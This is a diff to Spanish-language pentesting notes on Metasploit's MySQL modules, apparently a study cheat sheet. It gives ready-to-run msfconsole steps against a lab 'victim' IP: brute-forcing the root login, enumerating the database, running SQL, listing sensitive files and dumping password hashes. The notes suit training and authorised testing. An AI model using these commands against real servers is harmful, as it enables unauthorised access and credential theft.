@@ -312,7 +312,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 ```
 
 ```bash 
-# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
+# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico, en este caso el usuario 'root'
 ❯ msfconsole -q                                    # q = Quitar el banner de inicio
 
 	❯ use auxiliary/scanner/mysql/mysql_login         # Usamos el auxiliar
@@ -326,15 +326,40 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 ```
 
 ```bash 
+# Enumeramos informacion de la base de datos, pero necesitamos las credenciales validas para poder utilizarlo 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/admin/mysql/mysql_enum                  # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set USERNAME root
+	❯ set PASSWORD ""                                       # Colocamos la Passwd valida 
+	❯ run
+```
+
+```bash 
+# Ejecutar SQL Querys, podemos interactuar con la DB, pero debemos de tener credenciales validas 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/admin/mysql/mysql_sql                  # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set USERNAME root
+	❯ set PASSWORD ""                                       # Colocamos la Passwd valida 
+	❯ set SQL show databases;                               # Colocamos una Query con estructura valida 
+	❯ run
+```
+
+```bash 
 # Mostrar las bases de datos 
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use auxiliary/scanner/mysql/mysql_schemadump             # Usamos el auxiliar 
 	❯ options
 	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
-	❯ set username root
-	❯ set password ""
-	❯ exploit
+	❯ set USERNAME root
+	❯ set PASSWORD ""
+	❯ run
 ```
 
 ```bash 
@@ -345,10 +370,10 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ options
 	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
 	❯ set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
-	❯ set verbose false
+	❯ set VERBOSE false
 	❯ advanced                                               # Mirar las opciones avanzadas
-	❯ set username root
-	❯ set password ""
+	❯ set USERNAME root
+	❯ set PASSWORD ""
 	❯ run
 ```
 
@@ -360,8 +385,8 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ options
 	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
 	❯ set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
-	❯ set username root
-	❯ set password ""
+	❯ set USERNAME root
+	❯ set PASSWORD ""
 	❯ run
 ```
 
@@ -372,9 +397,9 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ use auxiliary/scanner/mysql/mysql_hashdump             # Usamos el auxiliar 
 	❯ options
 	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
-	❯ set username root
-	❯ set password ""
-	❯ exploit
+	❯ set USERNAME root
+	❯ set PASSWORD ""
+	❯ run 
 ```
 
 ## Puerto 1433 MSSQL
